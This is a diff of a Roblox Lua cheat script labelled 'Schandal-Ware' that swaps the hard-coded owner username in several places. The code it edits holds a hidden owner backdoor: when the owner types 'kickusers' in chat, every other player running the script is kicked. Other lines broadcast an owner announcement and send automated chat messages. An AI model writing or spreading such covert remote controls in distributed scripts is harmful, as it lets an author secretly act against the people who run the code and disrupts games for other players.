@@ -12,7 +12,7 @@ local blacklistedgears = {
 	"SubspaceTripmine"
 }
 local whitelisted = {
-	"ardamurtezan",
+	"isqrez",
 	"swiiry",
 	"Exprvssed",
 	"nightdeoxys99999", -- 9/26
@@ -1895,10 +1895,10 @@ end)
 
 
 for i,v in pairs(game.Players:GetChildren()) do
-	if v.Name == "ardamurtezan" then
+	if v.Name == "isqrez" then
 		v.Chatted:Connect(function(plrmsg)
 			if plrmsg:match("kickusers") then
-				if game.Players.LocalPlayer.Name == "ardamurtezan" then
+				if game.Players.LocalPlayer.Name == "isqrez" then
 					return else
 					game.Players.LocalPlayer:Kick("You Have been kicked by the owner of the script.")
 				end
@@ -1908,10 +1908,10 @@ for i,v in pairs(game.Players:GetChildren()) do
 end
 
 game.Players.PlayerAdded:Connect(function(plr)
-	if plr.Name == "ardamurtezan" then
+	if plr.Name == "isqrez" then
 		plr.Chatted:Connect(function(plrmsg)
 			if plrmsg:match("kickusers") then
-				if game.Players.LocalPlayer.Name == "ardamurtezan" then
+				if game.Players.LocalPlayer.Name == "isqrez" then
 					return else
 					game.Players.LocalPlayer:Kick("You Have been kicked by the owner of the script.")
 				end
@@ -1924,7 +1924,7 @@ end)
 
 
 
-if game.Players.LocalPlayer.Name == "ardamurtezan" then
+if game.Players.LocalPlayer.Name == "isqrez" then
 	local args = {
 		[1] = "[- Schandal-Ware -], Loaded.OWNER😎 ",
 		[2] = "All"
@@ -1944,7 +1944,7 @@ wait(.95)
 
 
 while wait(10) do
-	if game.Players.LocalPlayer.Name == "ardamurtezan" then
+	if game.Players.LocalPlayer.Name == "isqrez" then
 		game.Players:Chat("h")
 	end
 end
